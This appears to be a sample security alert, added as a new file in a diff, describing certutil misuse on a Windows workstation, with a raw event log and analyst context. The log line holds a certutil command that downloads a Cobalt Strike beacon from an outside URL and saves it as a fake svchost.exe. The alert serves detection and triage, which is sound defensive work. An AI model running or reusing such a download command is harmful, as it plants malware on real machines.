@@ -1,0 +1,16 @@
+Alert Metadata:
+Alert Name: Living off the Land Binary (Certutil) Usage
+Severity: High
+Timestamp: 2026-07-18T16:20:00Z
+Sensor: Windows Event Logs
+
+Raw Log Data:
+Jul 18 16:20:00 WKSTN-MKT-09 MSWinEventLog: 1 Security 4688 - - Process Creation. Creator Process ID: 0x1a4. Process Command Line: "certutil.exe" -urlcache -split -f http://raw.githubusercontent.com/maldev1/repo/main/beacon.exe C:\ProgramData\svchost.exe
+
+Artifact Panel Context:
+
+Payload Hash: The downloaded file beacon.exe has a known malicious hash associated with Cobalt Strike payloads.
+
+Directory Context: Saving an executable to C:\ProgramData\ masquerading as svchost.exe is a common defense evasion technique.
+
+Process Lineage: Certutil was spawned directly by winword.exe following a macro execution.
